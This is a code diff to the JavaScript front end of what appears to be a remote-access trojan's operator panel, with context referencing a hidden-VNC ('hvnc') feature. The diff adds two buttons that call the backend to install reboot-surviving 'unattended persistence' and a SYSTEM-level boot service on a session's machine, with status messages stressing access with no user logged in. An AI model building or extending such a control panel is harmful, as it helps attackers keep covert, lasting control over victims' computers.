@@ -201,6 +201,38 @@ document.getElementById("hvnc-start").addEventListener("click", async () => {
   setTimeout(connectDesktop, 1500);
 });
 
+document.getElementById("persist").addEventListener("click", async () => {
+  const status = document.getElementById("rd-status");
+  status.textContent = "installing unattended persistence…";
+  try {
+    const resp = await fetch(`/api/${sessionId}/persist`, {
+      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
+    });
+    const data = await resp.json();
+    status.textContent = resp.ok
+      ? "persistence installed — survives reboot, reachable with no user logged in"
+      : ("persist failed: " + (data.detail || resp.status));
+  } catch (err) {
+    status.textContent = "persist request failed";
+  }
+});
+
+document.getElementById("service").addEventListener("click", async () => {
+  const status = document.getElementById("rd-status");
+  status.textContent = "installing boot service (SYSTEM)…";
+  try {
+    const resp = await fetch(`/api/${sessionId}/service`, {
+      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
+    });
+    const data = await resp.json();
+    status.textContent = resp.ok
+      ? `service ${data.service} installed; auto-starts at boot with no user logged in`
+      : ("service install failed: " + (data.detail || resp.status));
+  } catch (err) {
+    status.textContent = "service request failed";
+  }
+});
+
 document.getElementById("hvnc-spawn-go").addEventListener("click", () => {
   const value = document.getElementById("hvnc-spawn").value.trim();
   if (!value || !rdSocket || rdSocket.readyState !== 1) return;
